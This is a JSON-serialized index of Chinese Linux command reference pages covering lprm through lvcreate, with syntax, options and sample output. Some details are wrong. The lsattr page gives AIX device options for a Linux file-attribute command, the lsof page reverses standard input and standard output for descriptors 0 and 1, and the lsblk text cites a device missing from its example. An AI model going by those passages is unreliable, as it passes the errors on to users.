命令】lprm","url":"/linux-command/lprm/","content":"\n删除打印队列中的打印任务\n\n## 补充说明\n\n**lprm命令** 用于删除打印队列中的打印任务。尚未完成的打印机任务会被放在打印机贮列之中，这个命令可用来将常未送到打印机的任务取消。\n\n###  语法\n\n```shell\nlprm(选项)(参数)\n```\n\n###  选项\n\n```shell\n-E：与打印服务器连接时强制使用加密；\n-P：指定接受打印任务的目标打印机；\n-U：指定可选的用户名。\n```\n\n###  参数\n\n打印任务：指定需删除的打印任务号。\n\n###  实例\n\n将打印机hpprint中的第102号任务移除：\n\n```shell\nlprm -Phpprint 102\n```\n\n将第101号任务由预设打印机中移除：\n\n```shell\nlprm 101\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","lprm"]},{"title":"【Linux 命令】lpstat","url":"/linux-command/lpstat/","content":"\n显示CUPS中打印机的状态信息\n\n## 补充说明\n\n**lpstat命令** 用于显示CUPS中打印机的状态信息。\n\n### 语法\n\n```shell\nlpstat(选项)\n```\n\n### 选项\n\n```shell\n-E：与打印机连接时加密；\n-R：显示打印任务的等级；\n-U：指定可选用户名；\n-a：显示接受打印任务的打印机；\n-c：显示打印机类；\n-d：显示默认打印机；\n-h：指定可选的服务器信息；\n-l：显示长格式；\n-p：显示指定打印机，以及打印机是否接受打印任务；\n-s：显示汇总信息；\n-t：显示所有的状态信息。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","lpstat"]},{"title":"【Linux 命令】lsattr","url":"/linux-command/lsattr/","content":"\n查看文件的第二扩展文件系统属性\n\n## 补充说明\n\n**lsattr命令** 用于查看文件的第二扩展文件系统属性。\n\n###  语法\n\n```shell\nlsattr(选项)(参数)\n```\n\n###  选项\n\n```shell\n-E：可显示设备属性的当前值，但这个当前值是从用户设备数据库中获得的，而不是从设备直接获得的。\n-D：显示属性的名称，属性的默认值，描述和用户是否可以修改属性值的标志。\n-R：递归的操作方式；\n-V：显示指令的版本信息；\n-a：列出目录中的所有文件，包括隐藏文件。\n```\n\nlsattr经常使用的几个选项-D，-E，-R这三个选项不可以一起使用，它们是互斥的，经常使用的还有-l,-H，使用lsattr时，必须指出具体的设备名，用-l选项指出要显示设备的逻辑名称，否则要用-c，-s，-t等选项唯一的确定某个已存在的设备。\n\n###  参数\n\n文件：指定显示文件系统属性的文件名。\n\n###  实例\n\n```shell\nlsattr -E -l rmt0 -H\nlsattr -EO -l rmt0\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","lsattr"]},{"title":"【Linux 命令】lsb_release","url":"/linux-command/lsb_release/","content":"\n显示发行版本信息\n\n## 补充说明\n\nLSB是Linux Standard Base的缩写， **lsb_release命令** 用来显示LSB和特定版本的相关信息。如果使用该命令时不带参数，则默认加上-v参数。\n\n```shell\n-v 显示版本信息。\n-i 显示发行版的id。\n-d 显示该发行版的描述信息。\n-r 显示当前系统是发行版的具体版本号。\n-c 发行版代号。\n-a 显示上面的所有信息。\n-h 显示帮助信息。\n```\n\n如果当前发行版是LSB兼容的，那么`/etc/lsb_release`文件中会包含LSB_VERSION域。这个域的值可以是用冒号隔开的一系列支持的模块。这些模块名是当前版本支持的LSB的模块名。如果当前版本不是LSB兼容的，就不要包含这个域。\n\n可选的域包括DISTRIB_ID, DISTRIB_RELEASE, DISTRIB_CODENAME,DISTRIB_DESCRIPTION，它们可以覆盖`/etc/distrib-release`文件中的内容。注：这里的distrib要替换为当前的发行版的名字。如果存在`/etc/lsb-release.d`目录，会在该目录中查找文件名并作为附加的模块版本加在LSB_VERSION前面。文件`/etc/distrib-release`中包含了一些描述信息，用来说明应该分析哪些文件名。\n\n 一般的格式是`Distributor release x.x (Codename)`  注意：Debian系统中缺乏相应的描述信息（见`/etc/debian-version`），为了支持Debian系统，大部分信息都被加在了lsb-release文件中。\n\nredhat和fedora系统中，还支持一个参数：\n\n```shell\n-s, --short  输出简短的描述信息。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","lsb_release"]},{"title":"【Linux 命令】lsblk","url":"/linux-command/lsblk/","content":"\n列出块设备信息\n\n## 补充说明\n\n**lsblk命令** 用于列出所有可用块设备的信息，而且还能显示他们之间的依赖关系，但是它不会列出RAM盘的信息。块设备有硬盘，闪存盘，cd-ROM等等。lsblk命令包含在util-linux-ng包中，现在该包改名为util-linux。这个包带了几个其它工具，如dmesg。要安装lsblk，请在此处下载util-linux包。Fedora用户可以通过命令`sudo yum install util-linux-ng`来安装该包。\n\n###  选项\n\n```shell\n-a, --all            # 显示所有设备。\n-b, --bytes          # 以bytes方式显示设备大小。\n-d, --nodeps         # 不显示 slaves 或 holders。\n-D, --discard        # print discard capabilities。\n-e, --exclude <list> # 排除设备 (default: RAM disks)。\n-f, --fs             # 显示文件系统信息。\n-h, --help           # 显示帮助信息。\n-i, --ascii          # use ascii characters only。\n-m, --perms          # 显示权限信息。\n-l, --list           # 使用列表格式显示。\n-n, --noheadings     # 不显示标题。\n-o, --output <list>  # 输出列。\n-P, --pairs          # 使用key=\"value\"格式显示。\n-r, --raw            # 使用原始格式显示。\n-t, --topology       # 显示拓扑结构信息。\n```\n\n###  实例\n\nlsblk命令默认情况下将以树状列出所有块设备。打开终端，并输入以下命令：\n\n```shell\nlsblk\n\nNAME   MAJ:MIN rm   SIZE RO type mountpoint\nsda      8:0    0 232.9G  0 disk \n├─sda1   8:1    0  46.6G  0 part /\n├─sda2   8:2    0     1K  0 part \n├─sda5   8:5    0   190M  0 part /boot\n├─sda6   8:6    0   3.7G  0 part [SWAP]\n├─sda7   8:7    0  93.1G  0 part /data\n└─sda8   8:8    0  89.2G  0 part /personal\nsr0     11:0    1  1024M  0 rom\n```\n\n7个栏目名称如下：\n\n1.   **NAME** ：这是块设备名。\n2.   **MAJ:MIN** ：本栏显示主要和次要设备号。\n3.   **RM** ：本栏显示设备是否可移动设备。注意，在本例中设备sdb和sr0的RM值等于1，这说明他们是可移动设备。\n4.   **SIZE** ：本栏列出设备的容量大小信息。例如298.1G表明该设备大小为298.1GB，而1K表明该设备大小为1KB。\n5.   **RO** ：该项表明设备是否为只读。在本案例中，所有设备的RO值为0，表明他们不是只读的。\n6.   **TYPE** ：本栏显示块设备是否是磁盘或磁盘上的一个分区。在本例中，sda和sdb是磁盘，而sr0是只读存储（rom）。\n7.   **MOUNTPOINT** ：本栏指出设备挂载的挂载点。\n\n默认选项不会列出所有空设备。要查看这些空设备，请使用以下命令：\n\n```shell\nlsblk -a\n```\n\nlsblk命令也可以用于列出一个特定设备的拥有关系，同时也可以列出组和模式。可以通过以下命令来获取这些信息：\n\n```shell\nlsblk -m\n```\n\n该命令也可以只获取指定设备的信息。这可以通过在提供给lsblk命令的选项后指定设备名来实现。例如，你可能对了解以字节显示你的磁盘驱动器大小比较感兴趣，那么你可以通过运行以下命令来实现：\n\n```shell\nlsblk -b /dev/sda\n\n等价于\n\nlsblk --bytes /dev/sda\n```\n\n你也可以组合几个选项来获取指定的输出。例如，你也许想要以列表格式列出设备，而不是默认的树状格式。你可能也对移除不同栏目名称的标题感兴趣。可以将两个不同的选项组合，以获得期望的输出，命令如下：\n\n```shell\nlsblk -nl\n```\n\n要获取SCSI设备的列表，你只能使用-S选项。该选项是大写字母S，不能和-s选项混淆，该选项是用来以颠倒的顺序打印依赖的。\n\n```shell\nlsblk -S\n```\n\nlsblk列出SCSI设备，而-s是逆序选项（将设备和分区的组织关系逆转过来显示），其将给出如下输出。输入命令：\n\n```shell\nlsblk -s\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","lsblk"]},{"title":"【Linux 命令】lscpu","url":"/linux-command/lscpu/","content":"\n显示有关CPU架构的信息\n\n## 补充说明\n\n**lscpu命令** 是显示有关CPU架构的信息。\n\n###  语法\n\n```shell\nlscpu [选项]\n```\n\n###  选项\n\n```shell\n -a, --all               # 打印在线和离线CPU（默认为-e）\n -b, --online            # 仅打印在线CPU（-p的默认值）\n -c, --offline           # 打印离线CPU\n -e, --extended[=<list>] # 打印出一个扩展的可读格式\n -p, --parse[=<list>]    # 打印出可解析的格式\n -s, --sysroot <dir>     # 将指定的目录用作系统根目录\n -x, --hex               # 打印十六进制掩码，而不是CPU列表\n\n -h, --help     # 显示此帮助并退出\n -V, --version  # 输出版本信息并退出\n```\n\n###  参数\n\n```shell\n可用列：\n           CPU  逻辑CPU编号\n          CORE  逻辑核心号码\n        SOCKET  逻辑套接字号\n          NODE  逻辑NUMA节点号\n          BOOK  逻辑书号\n         CACHE  显示了如何在CPU之间共享高速缓存\n  POLARIZATION  虚拟硬件上的CPU调度模式\n       ADDRESS  CPU的物理地址\n    CONFIGURED  显示管理程序是否分配了CPU\n        ONLINE  显示Linux是否正在使用CPU\n```\n\n### 例子\n\n```shell\n[root@localhost ~]# lscpu\nArchitecture:          x86_64\nCPU op-mode(s):        32-bit, 64-bit\nByte Order:            Little Endian\nCPU(s):                4\nOn-line CPU(s) list:   0-3\nThread(s) per core:    1\nCore(s) per socket:    4\nSocket(s):             1\nNUMA node(s):          1\nVendor ID:             GenuineIntel\nCPU family:            6\nModel:                 30\nModel name:            Intel(R) Xeon(R) CPU           X3430  @ 2.40GHz\nStepping:              5\nCPU MHz:               2394.055\nBogoMIPS:              4788.11\nVirtualization:        VT-x\nL1d cache:             32K\nL1i cache:             32K\nL2 cache:              256K\nL3 cache:              8192K\nNUMA node0 CPU(s):     0-3\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","lscpu"]},{"title":"【Linux 命令】lsmod","url":"/linux-command/lsmod/","content":"\n显示已载入系统的模块\n\n## 补充说明\n\n**lsmod命令** 用于显示已经加载到内核中的模块的状态信息。执行lsmod命令后会列出所有已载入系统的模块。Linux操作系统的核心具有模块化的特性，应此在编译核心时，务须把全部的功能都放入核心。您可以将这些功能编译成一个个单独的模块，待需要时再分别载入。\n\n###  语法\n\n```shell\nlsmod\n```\n\n###  实例\n\n```shell\n[root@LinServ-1 ~]# lsmod\nModule                  Size  Used by\nipv6                  272801  15\nxfrm_nalgo             13381  1 ipv6\ncrypto_api             12609  1 xfrm_nalgo\nip_conntrack_ftp       11569  0\nxt_limit                6721  2\nxt_state                6209  2\nip_conntrack           53665  2 ip_conntrack_ftp,xt_state\nnfnetlink              10713  1 ip_conntrack\nxt_tcpudp               7105  6\nxt_multiport            7233  1\niptable_filter          7105  1\nip_tables              17029  1 iptable_filter\nx_tables               17349  5 xt_limit,xt_state,xt_tcpudp,xt_multiport,ip_tables\ndm_mirror              24393  0\ndm_multipath           27213  0\nscsi_dh                12481  1 dm_multipath\nvideo                  21193  0\nbacklight              10049  1 video\nsbs                    18533  0\npower_meter            16461  0\nhwmon                   7365  1 power_meter\ni2c_ec                  9025  1 sbs\ndell_wmi                8401  0\nwmi                    12137  1 dell_wmi\nbutton                 10705  0\nbattery                13637  0\nasus_acpi              19289  0\nac                      9157  0\nlp                     15849  0\nsnd_hda_intel         401453  0\nsnd_seq_dummy           7877  0\nsnd_seq_oss            32577  0\nsnd_seq_midi_event     11073  1 snd_seq_oss\nsnd_seq                49585  5 snd_seq_dummy,snd_seq_oss,snd_seq_midi_event\nsnd_seq_device         11725  3 snd_seq_dummy,snd_seq_oss,snd_seq\nsnd_pcm_oss            42817  0\nsnd_mixer_oss          19009  1 snd_pcm_oss\nsnd_pcm                72517  2 snd_hda_intel,snd_pcm_oss\nide_cd                 40161  0\nsnd_timer              24517  2 snd_seq,snd_pcm\ntpm_tis                16713  0\nr8169                  43077  0\nsnd_page_alloc         14281  2 snd_hda_intel,snd_pcm\ntpm                    19041  1 tpm_tis\ni2c_i801               12737  0\nmii                     9409  1 r8169\nserio_raw              10693  0\ni2c_core               24897  2 i2c_ec,i2c_i801\nsnd_hwdep              12869  1 snd_hda_intel\ntpm_bios               11073  1 tpm\ncdrom                  36577  1 ide_cd\npcspkr                  7105  0\nparport_pc             29669  1\nsg                     36973  0\nsnd                    57797  9 snd_hda_intel,snd_seq_oss,snd_seq,snd_seq_device,snd_pcm_oss,snd_mixer_oss,snd_pcm,snd_timer,snd_hwdep\nparport                37513  2 lp,parport_pc\nsoundcore              11553  1 snd\ndm_raid45              67273  0\ndm_message              6977  1 dm_raid45\ndm_region_hash         15681  1 dm_raid45\ndm_log                 14785  3 dm_mirror,dm_raid45,dm_region_hash\ndm_mod                 63993  4 dm_mirror,dm_multipath,dm_raid45,dm_log\ndm_mem_cache            9537  1 dm_raid45\nata_piix               23749  4\nlibata                158085  1 ata_piix\nsd_mod                 25409  6\nscsi_mod              144277  4 scsi_dh,sg,libata,sd_mod\next3                  126281  3\njbd                    57705  1 ext3\nuhci_hcd               25421  0\nohci_hcd               24937  0\nehci_hcd               34509  0\n```\n\n*   第1列：表示模块的名称。\n*   第2列：表示模块的大小。\n*   第3列：表示依赖模块的个数。\n*   第4列：表示依赖模块的内容。\n\n通常在使用lsmod命令时，都会采用类似`lsmod | grep -i ext3`这样的命令来查询当前系统是否加载了某些模块。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","lsmod"]},{"title":"【Linux 命令】lsof","url":"/linux-command/lsof/","content":"\n显示Linux系统当前已打开的所有文件列表 `lsof -p pid`\n\n## 补充说明\n\n**lsof命令** 用于查看你进程打开的文件，打开文件的进程，进程打开的端口(TCP、UDP)。找回/恢复删除的文件。是十分方便的系统监视工具，因为lsof命令需要访问核心内存和各种文件，所以需要root用户执行。\n\n在linux环境下，任何事物都以文件的形式存在，通过文件不仅仅可以访问常规数据，还可以访问网络连接和硬件。所以如传输控制协议 (TCP) 和用户数据报协议 (UDP) 套接字等，系统在后台都为该应用程序分配了一个文件描述符，无论这个文件的本质如何，该文件描述符为应用程序与基础操作系统之间的交互提供了通用接口。因为应用程序打开文件的描述符列表提供了大量关于这个应用程序本身的信息，因此通过lsof工具能够查看这个列表对系统监测以及排错将是很有帮助的。\n\n### 语法\n\n```shell\nlsof (选项)\n```\n\n### 选项\n\n```shell\n-a：列出打开文件存在的进程；\n-c<进程名>：列出指定进程所打开的文件；\n-g：列出GID号进程详情；\n-d<文件号>：列出占用该文件号的进程；\n+d<目录>：列出目录下被打开的文件；\n+D<目录>：递归列出目录下被打开的文件；\n-n<目录>：列出使用NFS的文件；\n-i<条件>：列出符合条件的进程（协议、:端口、 @ip ）\n-p<进程号>：列出指定进程号所打开的文件；\n-u：列出UID号进程详情；\n-h：显示帮助信息；\n-v：显示版本信息\n```\n\n### 实例\n\n```shell\nlsof\ncommand     PID USER   FD      type             DEVICE     SIZE       NODE NAME\ninit          1 root  cwd       DIR                8,2     4096          2 /\ninit          1 root  rtd       DIR                8,2     4096          2 /\ninit          1 root  txt       REG                8,2    43496    6121706 /sbin/init\ninit          1 root  mem       REG                8,2   143600    7823908 /lib64/ld-2.5.so\ninit          1 root  mem       REG                8,2  1722304    7823915 /lib64/libc-2.5.so\ninit          1 root  mem       REG                8,2    23360    7823919 /lib64/libdl-2.5.so\ninit          1 root  mem       REG                8,2    95464    7824116 /lib64/libselinux.so.1\ninit          1 root  mem       REG                8,2   247496    7823947 /lib64/libsepol.so.1\ninit          1 root   10u     FIFO               0,17                1233 /dev/initctl\nmigration     2 root  cwd       DIR                8,2     4096          2 /\nmigration     2 root  rtd       DIR                8,2     4096          2 /\nmigration     2 root  txt   unknown                                        /proc/2/exe\nksoftirqd     3 root  cwd       DIR                8,2     4096          2 /\nksoftirqd     3 root  rtd       DIR                8,2     4096          2 /\nksoftirqd     3 root  txt   unknown                                        /proc/3/exe\nmigration     4 root  cwd       DIR                8,2     4096          2 /\nmigration     4 root  rtd       DIR                8,2     4096          2 /\nmigration     4 root  txt   unknown                                        /proc/4/exe\nksoftirqd     5 root  cwd       DIR                8,2     4096          2 /\nksoftirqd     5 root  rtd       DIR                8,2     4096          2 /\nksoftirqd     5 root  txt   unknown                                        /proc/5/exe\nevents/0      6 root  cwd       DIR                8,2     4096          2 /\nevents/0      6 root  rtd       DIR                8,2     4096          2 /\nevents/0      6 root  txt   unknown                                        /proc/6/exe\nevents/1      7 root  cwd       DIR                8,2     4096          2 /\n```\n\n **lsof输出各列信息的意义如下：**\n\n*   COMMAND：进程的名称\n*   PID：进程标识符\n*   PPID：父进程标识符（需要指定-R参数）\n*   USER：进程所有者\n*   PGID：进程所属组\n*   FD：文件描述符，应用程序通过文件描述符识别该文件。\n\n文件描述符列表：\n\n1.  cwd：表示current work dirctory，即：应用程序的当前工作目录，这是该应用程序启动的目录，除非它本身对这个目录进行更改\n2.  txt：该类型的文件是程序代码，如应用程序二进制文件本身或共享库，如上列表中显示的 /sbin/init 程序\n3.  lnn：library references (AIX);\n4.  er：FD information error (see NAME column);\n5.  jld：jail directory (FreeBSD);\n6.  ltx：shared library text (code and data);\n7.  mxx ：hex memory-mapped type number xx.\n8.  m86：DOS Merge mapped file;\n9.  mem：memory-mapped file;\n10.  mmap：memory-mapped device;\n11.  pd：parent directory;\n12.  rtd：root directory;\n13.  tr：kernel trace file (OpenBSD);\n14.  v86  VP/ix mapped file;\n15.  0：表示标准输出\n16.  1：表示标准输入\n17.  2：表示标准错误\n\n一般在标准输出、标准错误、标准输入后还跟着文件状态模式：\n\n1.  u：表示该文件被打开并处于读取/写入模式。\n2.  r：表示该文件被打开并处于只读模式。\n3.  w：表示该文件被打开并处于写入模式。\n4.  空格：表示该文件的状态模式为unknow，且没有锁定。\n5.  -：表示该文件的状态模式为unknow，且被锁定。\n\n同时在文件状态模式后面，还跟着相关的锁：\n\n1.  N：for a Solaris NFS lock of unknown type;\n2.  r：for read lock on part of the file;\n3.  R：for a read lock on the entire file;\n4.  w：for a write lock on part of the file;（文件的部分写锁）\n5.  W：for a write lock on the entire file;（整个文件的写锁）\n6.  u：for a read and write lock of any length;\n7.  U：for a lock of unknown type;\n8.  x：for an SCO OpenServer Xenix lock on part      of the file;\n9.  X：for an SCO OpenServer Xenix lock on the      entire file;\n10.  space：if there is no lock.\n\n文件类型：\n\n1.  DIR：表示目录。\n2.  CHR：表示字符类型。\n3.  BLK：块设备类型。\n4.  UNIX： UNIX 域套接字。\n5.  FIFO：先进先出 (FIFO) 队列。\n6.  IPv4：网际协议 (IP) 套接字。\n7.  DEVICE：指定磁盘的名称\n8.  SIZE：文件的大小\n9.  NODE：索引节点（文件在磁盘上的标识）\n10.  NAME：打开文件的确切名称\n11. REG：常规文件\n\n列出指定进程号所打开的文件:\n\n```shell\nlsof -p $pid\n```\n\n获取端口对应的进程ID=>pid\n\n```shell\nlsof -i:9981 -P -t -sTCP:LISTEN\n```\n\n列出打开文件的进程:\n\n```shell\nlsof $filename\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","lsof"]},{"title":"【Linux 命令】lspci","url":"/linux-command/lspci/","content":"\n显示当前主机的所有PCI总线信息\n\n## 补充说明\n\n**lspci命令** 用于显示当前主机的所有PCI总线信息，以及所有已连接的PCI设备信息。\n\n###  语法\n\n```shell\nlspci(选项)\n```\n\n###  选项\n\n```shell\n-n：以数字方式显示PCI厂商和设备代码；\n-t：以树状结构显示PCI设备的层次关系，包括所有的总线、桥、设备以及它们之间的联接；\n-b：以总线为中心的视图；\n-d：仅显示给定厂商和设备的信息；\n-s：仅显示指定总线、插槽上的设备和设备上的功能块信息；\n-i：指定PCI编号列表文件，而不使用默认的文件；\n-m：以机器可读方式显示PCI设备信息。\n```\n\n###  实例\n\n```shell\n[root@localhost ~]# lspci\n00:00.0 host bridge: Intel Corporation 5500 I/O Hub to ESI Port (rev 22)\n00:01.0 PCI bridge: Intel Corporation 5520/5500/X58 I/O Hub PCI Express Root Port 1 (rev 22)\n00:02.0 PCI bridge: Intel Corporation 5520/5500/X58 I/O Hub PCI Express Root Port 2 (rev 22)\n00:03.0 PCI bridge: Intel Corporation 5520/5500/X58 I/O Hub PCI Express Root Port 3 (rev 22)\n00:07.0 PCI bridge: Intel Corporation 5520/5500/X58 I/O Hub PCI Express Root Port 7 (rev 22)\n00:08.0 PCI bridge: Intel Corporation 5520/5500/X58 I/O Hub PCI Express Root Port 8 (rev 22)\n00:09.0 PCI bridge: Intel Corporation 5520/5500/X58 I/O Hub PCI Express Root Port 9 (rev 22)\n00:0a.0 PCI bridge: Intel Corporation 5520/5500/X58 I/O Hub PCI Express Root Port 10 (rev 22)\n00:10.0 PIC: Intel Corporation 5520/5500/X58 Physical and Link Layer Registers Port 0 (rev 22)\n00:10.1 PIC: Intel Corporation 5520/5500/X58 Routing and Protocol Layer Registers Port 0 (rev 22)\n00:11.0 PIC: Intel Corporation 5520/5500 Physical and Link Layer Registers Port 1 (rev 22)\n00:11.1 PIC: Intel Corporation 5520/5500 Routing & Protocol Layer Register Port 1 (rev 22)\n00:14.0 PIC: Intel Corporation 5520/5500/X58 I/O Hub System Management Registers (rev 22)\n00:14.1 PIC: Intel Corporation 5520/5500/X58 I/O Hub GPIO and Scratch Pad Registers (rev 22)\n00:14.2 PIC: Intel Corporation 5520/5500/X58 I/O Hub Control Status and RAS Registers (rev 22)\n00:14.3 PIC: Intel Corporation 5520/5500/X58 I/O Hub Throttle Registers (rev 22)\n00:16.0 System peripheral: Intel Corporation 5520/5500/X58 Chipset QuickData Technology Device (rev 22)\n00:16.1 System peripheral: Intel Corporation 5520/5500/X58 Chipset QuickData Technology Device (rev 22)\n00:16.2 System peripheral: Intel Corporation 5520/5500/X58 Chipset QuickData Technology Device (rev 22)\n00:16.3 System peripheral: Intel Corporation 5520/5500/X58 Chipset QuickData Technology Device (rev 22)\n00:16.4 System peripheral: Intel Corporation 5520/5500/X58 Chipset QuickData Technology Device (rev 22)\n00:16.5 System peripheral: Intel Corporation 5520/5500/X58 Chipset QuickData Technology Device (rev 22)\n00:16.6 System peripheral: Intel Corporation 5520/5500/X58 Chipset QuickData Technology Device (rev 22)\n00:16.7 System peripheral: Intel Corporation 5520/5500/X58 Chipset QuickData Technology Device (rev 22)\n00:1a.0 USB controller: Intel Corporation 82801JI (ICH10 Family) USB UHCI Controller #4\n00:1a.1 USB controller: Intel Corporation 82801JI (ICH10 Family) USB UHCI Controller #5\n00:1a.7 USB controller: Intel Corporation 82801JI (ICH10 Family) USB2 EHCI Controller #2\n00:1b.0 Audio device: Intel Corporation 82801JI (ICH10 Family) HD Audio Controller\n00:1c.0 PCI bridge: Intel Corporation 82801JI (ICH10 Family) PCI Express Root Port 1\n00:1c.4 PCI bridge: Intel Corporation 82801JI (ICH10 Family) PCI Express Root Port 5\n00:1c.5 PCI bridge: Intel Corporation 82801JI (ICH10 Family) PCI Express Root Port 6\n00:1d.0 USB controller: Intel Corporation 82801JI (ICH10 Family) USB UHCI Controller #1\n00:1d.1 USB controller: Intel Corporation 82801JI (ICH10 Family) USB UHCI Controller #2\n00:1d.2 USB controller: Intel Corporation 82801JI (ICH10 Family) USB UHCI Controller #3\n00:1d.3 USB controller: Intel Corporation 82801JI (ICH10 Family) USB UHCI Controller #6\n00:1d.7 USB controller: Intel Corporation 82801JI (ICH10 Family) USB2 EHCI Controller #1\n00:1e.0 PCI bridge: Intel Corporation 82801 PCI Bridge (rev 90)\n00:1f.0 ISA bridge: Intel Corporation 82801JIR (ICH10R) lpc Interface Controller\n00:1f.2 IDE interface: Intel Corporation 82801JI (ICH10 Family) 4 port SATA IDE Controller #1\n00:1f.3 SMBus: Intel Corporation 82801JI (ICH10 Family) SMBus Controller\n00:1f.5 IDE interface: Intel Corporation 82801JI (ICH10 Family) 2 port SATA IDE Controller #2\n01:01.0 VGA compatible controller: ASPEED Technology, Inc. ASPEED Graphics Family (rev 10)\n02:00.0 Ethernet controller: Intel Corporation 82574L Gigabit Network Connection\n03:00.0 Ethernet controller: Intel Corporation 82574L Gigabit Network Connection\n04:00.0 Serial Attached SCSI controller: LSI Logic / Symbios Logic SAS2008 PCI-Express Fusion-MPT SAS-2 [Falcon] (rev 03)\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","lspci"]},{"title":"【Linux 命令】lsusb","url":"/linux-command/lsusb/","content":"\n显示本机的USB设备列表信息\n\n## 补充说明\n\n**lsusb命令** 用于显示本机的USB设备列表，以及USB设备的详细信息。\n\nlsusb命令是一个学习USB驱动开发，认识USB设备的助手，推荐大家使用，如果您的开发板中或者产品中没有lsusb命令可以自己移植一个，放到文件系统里面。\n\n###  语法\n\n```shell\nlsusb(选项)\n```\n\n###  选项\n\n```shell\n-v：显示USB设备的详细信息；\n-s<总线：设备号>仅显示指定的总线和（或）设备号的设备；\n-d<厂商：产品>：仅显示指定厂商和产品编号的设备；\n-t：以树状结构显示无理USB设备的层次；\n-V：显示命令的版本信息。\n```\n\n###  实例\n\n插入usb鼠标后执行lsusb的输出内容如下:\n\n```shell\nBus 005 Device 001: id 0000:0000 \nBus 001 Device 001: ID 0000:0000 \nBus 004 Device 001: ID 0000:0000 \nBus 003 Device 001: ID 0000:0000 \nBus 002 Device 006: ID 15d9:0a37 \nBus 002 Device 001: ID 0000:0000 \n```\n\n解释：\n\n **Bus 005** \n\n表示第五个usb主控制器(机器上总共有5个usb主控制器 -- 可以通过命令lspci | grep USB查看)\n\n **Device 006** \n\n表示系统给usb鼠标分配的设备号(devnum)，同时也可以看到该鼠标是插入到了第二个usb主控制器\n\n```shell\n006        usb_device.devnum\n/sys/devices/pci0000:00/0000:00:1d.1/usb2/2-2/devnum\n```\n\n **ID 15d9:0a37** \n\n表示usb设备的ID（这个ID由芯片制造商设置，可以唯一表示该设备）\n\n```shell\n15d9    usb_device_descriptor.idVendor\n0a37    usb_device_descriptor.idProduct\n/sys/devices/pci0000:00/0000:00:1d.1/usb2/2-2/idVendor\n```\n\n**Bus 002 Device 006: ID 15d9:0a37  \nBus 002 Device 001: ID 0000:0000**\n\n表示002号usb主控制器上接入了两个设备:\n\n* 一个是usb根Hub -- 001 \n* 一个是usb鼠标  -- 006\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","lsusb"]},{"title":"【Linux 命令】ltrace","url":"/linux-command/ltrace/","content":"\n用来跟踪进程调用库函数的情况\n\n## 补充说明\n\n**ltrace命令** 是用来跟踪进程调用库函数的情况。\n\n###  语法\n\n```shell\nltrace [option ...] [command [arg ...]]\n```\n\n###  选项\n\n```shell\n-a 对齐具体某个列的返回值。\n-c 计算时间和调用，并在程序退出时打印摘要。\n-C 解码低级别名称（内核级）为用户级名称。\n-d 打印调试信息。\n-e 改变跟踪的事件。\n-f 跟踪子进程。\n-h 打印帮助信息。\n-i 打印指令指针，当库调用时。\n-l 只打印某个库中的调用。\n-L 不打印库调用。\n-n, --indent=NR 对每个调用级别嵌套以NR个空格进行缩进输出。\n-o, --output=file 把输出定向到文件。\n-p PID 附着在值为PID的进程号上进行ltrace。\n-r 打印相对时间戳。\n-s STRLEN 设置打印的字符串最大长度。\n-S 显示系统调用。\n-t, -tt, -ttt 打印绝对时间戳。\n-T 输出每个调用过程的时间开销。\n-u USERNAME 使用某个用户id或组ID来运行命令。\n-V, --version 打印版本信息，然后退出。\n-x NAME treat the global NAME like a library subroutine.（求翻译）\n```\n\n###  实例\n\n最基本应用，不带任何参数：\n\n```shell\n[guest@localhost tmp]$ ltrace ./a.out\n__libc_start_main(0x80484aa, 1, 0xbfc07744, 0x8048550, 0x8048540 <unfinished ...>\nprintf(\"no1:%d \\t no2:%d \\t diff:%d\\n\", 10, 6, 4no1:10 no2:6 diff:4 ) = 24\nprintf(\"no1:%d \\t no2:%d \\t diff:%d\\n\", 9, 7, 2no1:9 no2:7 diff:2 ) = 23\nprintf(\"no1:%d \\t no2:%d \\t diff:%d\\n\", 8, 8, 0no1:8 no2:8 diff:0 ) = 23\n--- SIGFPE (Floating point exception) ---\n+++ killed by SIGFPE +++\n```\n\n输出调用时间开销：\n\n```shell\n[guest@localhost tmp]$ ltrace -T ./a.out\n__libc_start_main(0x80484aa, 1, 0xbf81d394, 0x8048550, 0x8048540 <unfinished ...>\nprintf(\"no1:%d \\t no2:%d \\t diff:%d\\n\", 10, 6, 4no1:10 no2:6 diff:4 ) = 24 <0.000972>\nprintf(\"no1:%d \\t no2:%d \\t diff:%d\\n\", 9, 7, 2no1:9 no2:7 diff:2 ) = 23 <0.000155>\nprintf(\"no1:%d \\t no2:%d \\t diff:%d\\n\", 8, 8, 0no1:8 no2:8 diff:0 ) = 23 <0.000153>\n--- SIGFPE (Floating point exception) ---\n+++ killed by SIGFPE +++\n```\n\n显示系统调用：\n\n```shell\n[guest@localhost tmp]$ ltrace -S ./a.out\nSYS_brk(NULL) = 0x9e20000\nSYS_access(0xa4710f, 4, 0xa4afc0, 0, 0xa4b644) = 0\nSYS_open(\"/etc/ld.so.preload\", 0, 02) = 3\nSYS_fstat64(3, 0xbfbd7a94, 0xa4afc0, -1, 3) = 0\nSYS_mmap2(0, 17, 3, 2, 3) = 0xb7f2a000\nSYS_close(3) = 0\nSYS_open(\"/lib/libcwait.so\", 0, 00) = 3\nSYS_read(3, \"\\177ELF\\001\\001\\001\", 512) = 512\nSYS_fstat64(3, 0xbfbd76fc, 0xa4afc0, 4, 0xa4b658) = 0\nSYS_mmap2(0, 4096, 3, 34, -1) = 0xb7f29000\nSYS_mmap2(0, 5544, 5, 2050, 3) = 0x423000\nSYS_mmap2(0x424000, 4096, 3, 2066, 3) = 0x424000\n.............省去若干行\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ltrace"]},{"title":"【Linux 命令】lvcreate","url":"/linux-command/lvcreate/","content":"\n用于创建LVM的逻辑卷\n\n## 补充说明\n\n**lvcreate命令** 